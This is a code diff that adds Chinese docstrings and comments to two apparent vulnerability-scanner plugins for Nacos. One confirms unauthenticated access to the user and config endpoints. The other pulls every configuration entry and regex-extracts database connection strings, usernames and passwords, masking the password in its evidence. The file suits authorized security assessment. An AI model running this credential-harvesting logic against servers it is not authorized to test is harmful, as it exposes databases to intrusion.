@@ -32,6 +32,15 @@ class NacosUnauthPlugin(PluginBase):
     _NACOS_PATHS = ["/nacos", ""]  # 同端口部署或独立端口
 
     def verify(self, target, session):
+        """探测 Nacos 未授权访问：用户接口与配置接口双确认
+
+        逐前缀检查 /v1/auth/users 与 /v1/cs/configs，两个接口均可读才判定
+        未授权（CONFIRMED）；仅首页可达但接口不可读判定为已开启认证（SAFE）。
+
+        @param target: 扫描目标 URL
+        @param session: HTTP 会话（含登录态与 cookie 处理）
+        @return: ScanResult；CONFIRMED=未授权可读，SAFE=未发现/已认证，UNKNOWN=网络异常
+        """
         for prefix in self._NACOS_PATHS:
             # 检查用户列表接口（未授权访问特征）
             url = join_url(target, f"{prefix}/v1/auth/users?pageNo=1&pageSize=1")
@@ -44,6 +53,7 @@ class NacosUnauthPlugin(PluginBase):
             # 未授权特征：返回 JSON 含 username 字段（无 403）
             if "username" in text and resp.status_code == 200:
                 # 进一步验证配置接口可访问
+                # dataId/group/tenant 全空 = 列出全部配置；pageSize 调小避免响应过大
                 config_url = join_url(target, f"{prefix}/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=10")
                 try:
                     config_resp = session.get(config_url)
@@ -98,6 +108,14 @@ class NacosConfigExtractPlugin(PluginBase):
     fix = "Nacos 配置中的敏感信息加密存储，开启认证和访问控制"
 
     def verify(self, target, session):
+        """拉取 Nacos 全量配置，正则提取数据库连接凭证
+
+        遍历配置列表逐条拉取内容，命中 jdbc 连接串即停止；证据中密码脱敏。
+
+        @param target: 扫描目标 URL
+        @param session: HTTP 会话（含登录态与 cookie 处理）
+        @return: ScanResult；CONFIRMED=提取到 db 凭证，SAFE=未提取到，UNKNOWN=网络异常
+        """
         # 拉取配置列表
         list_url = join_url(target, "/nacos/v1/cs/configs?dataId=&group=&tenant=&pageNo=1&pageSize=100")
         try:
@@ -143,6 +161,7 @@ class NacosConfigExtractPlugin(PluginBase):
             if pwd_match:
                 db_password = pwd_match.group(1)
 
+            # 已取得完整连接串（地址+用户名）即停止遍历，减少后续无效请求
             if db_url and db_username:
                 break
 
@@ -153,6 +172,7 @@ class NacosConfigExtractPlugin(PluginBase):
             if db_username:
                 evidence_parts.append(f"用户名: {db_username}")
             if db_password:
+                # 证据不回显明文密码，仅标记已提取（脱敏规范）
                 evidence_parts.append("密码: 已提取（脱敏）")
             return ScanResult(
                 kind="chain",
